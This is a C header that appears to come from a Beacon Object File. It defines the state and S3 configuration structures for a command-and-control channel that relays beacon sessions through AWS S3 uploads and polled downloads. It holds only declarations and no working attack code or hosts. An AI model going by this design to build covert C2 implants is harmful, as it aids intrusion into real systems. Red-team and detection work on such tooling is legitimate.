#pragma once
#include <stdint.h>
#include <windows.h>

// FrameType describes the kind of payload being transferred.
// - Metadata: initial data frame sent when a session is first created
// - Frame: regular data frame containing the actual payload
// - Exit: indicates the session should be terminated
typedef enum { Metadata, Frame, Exit } FrameType;

// S3Info holds the static configuration required to interact with the S3
// upload/download endpoints. Fields are copied into multipart form fields
// when uploading and used to construct the download URL when polling.
// - host: hostname for the S3 bucket
// - uploadKey: key component for uploads
// - downloadKey: key/path component used to build the download URL
// - xAmzCredential, xAmzDate, xAmzSignature, xAmzPolicy: AWS form fields
//   required for S3 POST uploads
typedef struct {
    wchar_t host[128];
    char uploadKey[32];
    char downloadKey[32];
    char xAmzCredential[128];
    char xAmzDate[32];
    char xAmzSignature[128];
    char xAmzPolicy[1024];
} S3Info;

// C2State is the global state for the C2 channel. It is placed in the
// .data section and contains runtime values used across the BOF:
// - connected: whether a session has been established
// - sessionId: UUID string, used as the per-beacon session id
// - hSession: WinHTTP session handle used for all HTTP requests
// - maxFrameRetries / frameRetryDelayMs: retry policy for polling
// - nonce: last-seen frame nonce to detect duplicate frames
// - s3: configured S3 information (see S3Info above)
// - arenaOffset / arena: simple bump allocator used for temporary buffers
typedef struct {
    bool connected;
    RPC_CSTR sessionId;
    HINTERNET hSession;
    int maxFrameRetries;
    int frameRetryDelayMs;
    uint64_t nonce;
    S3Info s3;
    size_t arenaOffset;
    char arena[8 * 1024];
} C2State;
